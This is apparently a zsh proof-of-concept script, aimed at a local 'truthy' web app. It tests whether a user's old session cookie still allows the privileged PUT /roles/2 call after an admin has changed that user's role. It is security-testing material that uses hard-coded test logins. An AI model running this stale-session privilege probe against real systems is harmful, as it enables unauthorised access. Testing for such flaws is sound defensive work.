#!/usr/bin/env zsh
set -u
PORT=${1:-8100}
DB=${2:-truthy-db}
B=http://localhost:$PORT
J='Content-Type: application/json'
T=$(mktemp -d)
login () { curl -s -o /dev/null -w '%{http_code}' -c $T/$1 -H "$J" -d "{\"username\":\"$1\",\"password\":\"$2\",\"remember\":true}" $B/auth/login }
src () { curl -s -o /dev/null -w '%{http_code}' -X PUT -b $T/$1 -H "$J" -d '{"name":"normal","description":"handcheck"}' $B/roles/2 }
VID=$(docker exec $DB psql -U truthy -d truthy -tAc "select id from \"user\" where username='victim'")
echo "victim id $VID"
echo "login admin $(login admin Truthy@123)"
echo "login victim $(login victim Victim@123)"
echo "login viewer $(login viewer Viewer@123)"
echo "source PUT /roles/2 victim $(src victim)"
echo "source PUT /roles/2 viewer $(src viewer)"
cp $T/victim $T/victim-old
echo "transition PUT /users/$VID roleId=2 admin $(curl -s -o /dev/null -w '%{http_code}' -X PUT -b $T/admin -H "$J" -d '{"roleId":2}' $B/users/$VID)"
echo "role now $(docker exec $DB psql -U truthy -d truthy -tAc "select r.name from \"user\" u join role r on r.id = u.\"roleId\" where u.id=$VID")"
echo "follow-up old cookie $(curl -s -o /dev/null -w '%{http_code}' -X PUT -b $T/victim-old -H "$J" -d '{"name":"normal","description":"handcheck"}' $B/roles/2)"
echo "relogin victim $(login victim Victim@123)"
echo "follow-up new cookie $(src victim)"
rm -rf $T
